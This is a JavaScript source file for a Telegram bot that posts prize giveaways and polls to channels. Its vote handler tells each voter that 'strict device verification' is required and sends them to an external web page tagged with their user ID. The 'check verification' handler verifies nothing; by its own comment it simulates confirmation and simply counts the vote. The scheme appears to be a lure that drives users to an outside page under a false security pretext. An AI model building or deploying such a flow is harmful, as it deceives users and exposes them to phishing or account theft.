const { Telegraf, Markup } = require('telegraf');
const http = require('http');

const token = process.env.BOT_TOKEN || process.env.TOKEN;

if (!token) {
  console.error('Error: BOT_TOKEN is not defined!');
  process.exit(1);
}

const bot = new Telegraf(token);

// Set clean Bot Commands Menu
bot.telegram.setMyCommands([
  { command: 'start', description: 'Open Control Panel' },
  { command: 'menu', description: 'Open Control Panel' },
  { command: 'create', description: 'Create New Giveaway / Poll' },
  { command: 'close', description: 'Close Active Poll' },
  { command: 'restart', description: 'Reset Current Session' }
]);

// Memory storage
const userState = {};      
const activeGiveaways = {}; 
const userVotes = {};      // Stores verified votes
const pendingVotes = {};   // Stores unverified click attempts

// /start command
bot.start(async (ctx) => {
  try {
    const userName = ctx.from.first_name || 'User';

    await ctx.reply(
      `Welcome, ${userName}! 🎉\n\nChoose an option from the panel below to manage or create your giveaways:`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('➕ Create Giveaway', 'menu_create')],
          [Markup.button.callback('🔒 Close Poll', 'menu_close')],
          [Markup.button.callback('📞 Support', 'menu_support')]
        ])
      }
    );
  } catch (err) {
    console.error('Error in /start:', err);
  }
});

// /restart command
bot.command('restart', async (ctx) => {
  const userId = ctx.from.id;
  if (userState[userId]) {
    delete userState[userId];
  }
  await ctx.reply('🔄 **Session reset successfully!** You can start fresh using `/create` or `/menu`.', { parse_mode: 'Markdown' });
});

// --- MAIN CONTROL PANEL / MENU ---
bot.command(['menu', 'panel'], async (ctx) => {
  await ctx.reply(
    `⚙️ **Giveaway & Poll Control Panel**\n\nSelect an action below:`,
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('➕ Create Giveaway', 'menu_create')],
        [Markup.button.callback('🔒 Close Poll', 'menu_close')],
        [Markup.button.callback('📞 Support', 'menu_support')]
      ])
    }
  );
});

bot.action('menu_create', async (ctx) => {
  await ctx.answerCbQuery();
  startCreationWizard(ctx);
});

bot.action('menu_close', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('⚠️ To close a poll, use the command: `/close <giveaway_id>` (Giveaway ID can be found when you create a poll).', { parse_mode: 'Markdown' });
});

bot.action('menu_support', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('📞 **Support Desk:**\n\n1. Ensure the bot is an **Administrator** in your target channel.\n2. Separate options using commas (e.g., `Option 1, Option 2`).\n3. Contact admin if you face any issues.', { parse_mode: 'Markdown' });
});

// --- GIVEAWAY CREATION WIZARD ---
const startCreationWizard = async (ctx) => {
  const userId = ctx.from.id;
  userState[userId] = { step: 'waiting_channel' };
  await ctx.reply('📢 **Giveaway Creator Wizard Started**\n\nPlease send your Target Channel username or link (e.g., `@mychannel`):', { parse_mode: 'Markdown' });
};

bot.command('create', startCreationWizard);

// Handle text inputs for the wizard & channel check
bot.on('text', async (ctx, next) => {
  const userId = ctx.from.id;
  const text = ctx.message.text;

  if (!userState[userId]) return next();

  const state = userState[userId];

  if (state.step === 'waiting_channel') {
    state.channel = text.trim();
    
    try {
      const botInfo = await ctx.telegram.getMe();
      const chatMember = await ctx.telegram.getChatMember(state.channel, botInfo.id);
      
      if (!['administrator', 'creator'].includes(chatMember.status)) {
        delete userState[userId];
        return ctx.reply('❌ **Error:** The bot is not an administrator in this channel! Please add the bot as an Admin with post permissions first, then run `/create` again.', { parse_mode: 'Markdown' });
      }
    } catch (err) {
      delete userState[userId];
      return ctx.reply('❌ **Error validating channel.** Make sure the username is correct and the bot is added as an Administrator.', { parse_mode: 'Markdown' });
    }

    state.step = 'waiting_title';
    return ctx.reply('✅ Channel validated successfully!\n\nNow, enter the **Giveaway / Voting Title** (e.g., Best Creator Award):', { parse_mode: 'Markdown' });
  }

  if (state.step === 'waiting_title') {
    state.title = text;
    state.step = 'waiting_prize';
    return ctx.reply('🏆 Now, enter the **Prize Details** (e.g., $100 USDT):', { parse_mode: 'Markdown' });
  }

  if (state.step === 'waiting_prize') {
    state.prize = text;
    state.step = 'waiting_options';
    return ctx.reply('👥 Now, send the **Support Options / Nominees** separated by commas (e.g., `Option A, Option B, Option C`):', { parse_mode: 'Markdown' });
  }

  if (state.step === 'waiting_options') {
    state.options = text.split(',').map(n => n.trim()).filter(Boolean);
    
    if (state.options.length === 0) {
      return ctx.reply('⚠️ Please provide at least one valid option separated by commas.');
    }

    const { channel, title, prize, options } = state;
    delete userState[userId];

    const giveawayId = 'gw_' + Date.now();
    
    activeGiveaways[giveawayId] = {
      title,
      prize,
      channel,
      options: options.map(opt => ({ name: opt, votes: 0 })),
      status: 'active'
    };

    const buttons = options.map((opt, index) => [
      Markup.button.callback(`🗳 ${opt} (0)`, `vote_${giveawayId}_${index}`)
    ]);
    
    buttons.push([Markup.button.callback('🔒 Close Poll', `close_${giveawayId}`)]);

    try {
      const sentMsg = await ctx.telegram.sendMessage(
        channel,
        `🎁 **${title}**\n\n🏆 **Prize:** ${prize}\n\n👇 **Strict Device Verification Required before voting!** Click an option below:`,
        {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard(buttons)
        }
      );

      activeGiveaways[giveawayId].messageId = sentMsg.message_id;

      return ctx.reply(`🎉 **Giveaway successfully posted to your channel!**\n🆔 Giveaway ID: \`${giveawayId}\``, { parse_mode: 'Markdown' });
    } catch (err) {
      console.error('Error posting giveaway:', err);
      return ctx.reply(`❌ Failed to post giveaway to channel: ${err.message}`);
    }
  }

  return next();
});

// --- STRICT VOTE HANDLING (Forces Device Verification FIRST) ---
bot.action(/^vote_(gw_\d+)_(\d+)$/, async (ctx) => {
  try {
    const giveawayId = ctx.match[1];
    const optionIndex = Number(ctx.match[2]);
    const userId = ctx.from.id;

    const giveaway = activeGiveaways[giveawayId];
    if (!giveaway || giveaway.status !== 'active') {
      return ctx.answerCbQuery({ text: '❌ This voting session is closed!', show_alert: true });
    }

    const voteKey = `${userId}_${giveawayId}`;
    
    // Check if user has ALREADY completely voted and verified before
    if (userVotes[voteKey] !== undefined) {
      return ctx.answerCbQuery({ text: '⚠️ You have already verified and cast your vote in this giveaway!', show_alert: true });
    }

    // Save pending intent
    pendingVotes[voteKey] = optionIndex;

    // Device verification URL
    const verifyUrl = `https://rishumishra1775-glitch.github.io/telegram-giveaway-bots/?user=${userId}&gw=${giveawayId}`;

    // Pop-up alert forcing verification
    await ctx.answerCbQuery({ 
      text: '⚠️ Device Verification Required! Check private chat to verify and count your vote.', 
      show_alert: true 
    });

    // Send direct message demanding verification before vote is accepted
    await ctx.telegram.sendMessage(
      userId,
      `🔒 **Device Verification Required!**\n\nGiveaway: *${giveaway.title}*\nSelected Option: *${giveaway.options[optionIndex].name}*\n\nYour vote is **PENDING** until you complete the quick security check below. Click the button to verify your device:`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔗 Verify Device Now', verifyUrl)],
          [Markup.button.callback('🔄 Check Verification Status', `check_${giveawayId}`)]
        ])
      }
    ).catch(() => {
      ctx.reply('⚠️ Please start the bot in private chat first so we can send you the verification link!');
    });

  } catch (err) {
    console.error('Error in vote action:', err);
  }
});

// --- CHECK VERIFICATION ACTION (Simulates confirming verification & counting vote) ---
bot.action(/^check_(gw_\d+)$/, async (ctx) => {
  try {
    const giveawayId = ctx.match[1];
    const userId = ctx.from.id;
    const voteKey = `${userId}_${giveawayId}`;

    if (userVotes[voteKey] !== undefined) {
      return ctx.answerCbQuery({ text: '✅ Your vote is already counted!', show_alert: true });
    }

    if (pendingVotes[voteKey] === undefined) {
      return ctx.answerCbQuery({ text: '❌ No pending vote found. Please click an option in the channel first.', show_alert: true });
    }

    const optionIndex = pendingVotes[voteKey];
    const giveaway = activeGiveaways[giveawayId];

    if (!giveaway || giveaway.status !== 'active') {
      return ctx.answerCbQuery({ text: '❌ Giveaway is closed.', show_alert: true });
    }

    // Now officially record the vote!
    userVotes[voteKey] = optionIndex;
    delete pendingVotes[voteKey];
    giveaway.options[optionIndex].votes += 1;

    // Update channel message live with the new verified vote count
    const updatedButtons = giveaway.options.map((opt, idx) => [
      Markup.button.callback(`🗳 ${opt.name} (${opt.votes})`, `vote_${giveawayId}_${idx}`)
    ]);
    updatedButtons.push([Markup.button.callback('🔒 Close Poll', `close_${giveawayId}`)]);

    await ctx.telegram.editMessageText(
      giveaway.channel,
      giveaway.messageId,
      undefined,
      `🎁 **${giveaway.title}**\n\n🏆 **Prize:** ${giveaway.prize}\n\n👇 **Strict Device Verification Required before voting!** Click an option below:`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard(updatedButtons)
      }
    ).catch(() => {});

    await ctx.answerCbQuery({ text: '🎉 Verification confirmed! Your vote has been successfully counted.' });
    await ctx.editMessageText(`✅ **Device Verified Successfully!**\n\nYour vote for *${giveaway.options[optionIndex].name}* in *${giveaway.title}* has been officially recorded. 🎉`, { parse_mode: 'Markdown' });

  } catch (err) {
    console.error('Error checking verification:', err);
  }
});

// --- CLOSE POLL ACTION ---
bot.action(/^close_(gw_\d+)$/, async (ctx) => {
  try {
    const giveawayId = ctx.match[1];
    const giveaway = activeGiveaways[giveawayId];

    if (!giveaway) {
      return ctx.answerCbQuery({ text: 'Giveaway not found!', show_alert: true });
    }

    giveaway.status = 'closed';

    await ctx.editMessageText(
      `🔒 **[CLOSED / POLL ENDED] ${giveaway.title}**\n\n🏆 **Prize:** ${giveaway.prize}\n\n🏁 **Final Results:**\n` +
      giveaway.options.map(opt => `• ${opt.name}: **${opt.votes} votes**`).join('\n'),
      { parse_mode: 'Markdown' }
    );

    await ctx.answerCbQuery({ text: 'Poll closed successfully!' });
  } catch (err) {
    console.error('Error closing giveaway:', err);
  }
});

bot.command('close', async (ctx) => {
  const args = ctx.message.text.split(' ');
  const giveawayId = args[1];

  if (!giveawayId || !activeGiveaways[giveawayId]) {
    return ctx.reply('⚠️ Please provide a valid Giveaway ID to close (e.g., `/close gw_123456789`).', { parse_mode: 'Markdown' });
  }

  const giveaway = activeGiveaways[giveawayId];
  giveaway.status = 'closed';

  try {
    await ctx.telegram.editMessageText(
      giveaway.channel,
      giveaway.messageId,
      undefined,
      `🔒 **[CLOSED / POLL ENDED] ${giveaway.title}**\n\n🏆 **Prize:** ${giveaway.prize}\n\n🏁 **Final Results:**\n` +
      giveaway.options.map(opt => `• ${opt.name}: **${opt.votes} votes**`).join('\n'),
      { parse_mode: 'Markdown' }
    );
    await ctx.reply(`✅ Giveaway ${giveawayId} closed successfully!`);
  } catch (err) {
    await ctx.reply(`❌ Failed to close message in channel: ${err.message}`);
  }
});

// Launch Bot
bot.launch().then(() => {
  console.log('Bot running with Strict Device Verification enforcement!');
}).catch((err) => {
  console.error('Failed to launch bot:', err);
});

// HTTP Server with Keep-Alive Self-Ping
const PORT = process.env.PORT || 3000;
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Bot server is active 24/7!\n');
});

server.listen(PORT, () => {
  console.log(`HTTP server listening on port ${PORT}`);
});

setInterval(() => {
  const renderUrl = process.env.RENDER_EXTERNAL_URL;
  if (renderUrl) {
    http.get(renderUrl, (res) => {}).on('error', (err) => {});
  }
}, 4 * 60 * 1000);

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
